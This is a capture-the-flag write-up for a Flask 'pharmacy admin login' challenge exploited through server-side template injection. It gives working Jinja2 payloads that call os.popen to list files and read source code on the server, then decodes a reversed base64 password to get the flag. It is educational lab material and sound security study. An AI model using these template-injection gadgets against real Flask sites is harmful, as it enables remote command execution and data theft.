# Injection (200)

## Description:
```
Our local pharmacy exposed admin login to the public, can you exploit it? http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/
```

## Writeup

The site is vulnerable to SSTI (server-side template injection). Arguments like `{{2*2}}` will get evaluated by the site. By using [burp-parameter-settings.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) common variable names can be bruteforced ([brute.py](./brute.py)). By executing `http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/{{config}}` the server returns some flask specific environment variables.

Python gadgets can be used to access the server's file system:
```
http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/{{url_for.__globals__.os.popen("ls").read()}}
http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/{{url_for.__globals__.os.popen("cat lib/security.php").read()}}
```

*security.php*
```python3
import base64

def validate_login(username, password):
  if username != 'admin':
    return False
  valid_password = 'QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ'
  return base64.b64encode(password.encode('ascii')).decode('ascii')[::-1].lstrip('=') == valid_password
```

Add the padding characters, reverse the string and decode it:
```bash
$ echo ==QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ | rev | base64 -d
```

Flag: `dctf{4ll_us3r_1nput_1s_3v1l}`

**Resources:**

https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee  
https://www.youtube.com/watch?v=SN6EVIG4c-0&t=505s
